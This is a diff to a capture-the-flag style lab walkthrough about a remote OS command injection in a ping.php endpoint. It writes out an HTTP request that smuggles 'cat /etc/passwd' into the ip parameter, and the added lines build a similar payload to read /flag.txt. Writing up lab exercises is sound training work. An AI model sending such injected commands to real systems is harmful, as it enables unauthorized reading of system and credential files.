@@ -83,6 +83,7 @@ Solution:
 5) take the "Remote OS Command Injection"   and review its request payload :
 ```
 "Remote OS Command Injection" 
+
 GET /devtools/ping.php?ip=127.0.0.1%26cat+%2Fetc%2Fpasswd%26 HTTP/1.1
 Host: 94.237.61.133:39523
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
@@ -96,6 +97,9 @@ Priority: u=0, i
 
 ```
 ![[Screenshot From 2025-04-04 12-19-46.png]]
+as show in SS this request executes on target server and returns /etc/passwd  contents in response, therefore we confirm Remote OS Command Injection is there .
 
 
-Now 
+Now , create this payload: GET /devtools/ping.php?ip=127.0.0.1&cat /flag.txt& , to solve the Question "try to use it to read the flag at '/flag.txt"
+
+Url encode the payload as well
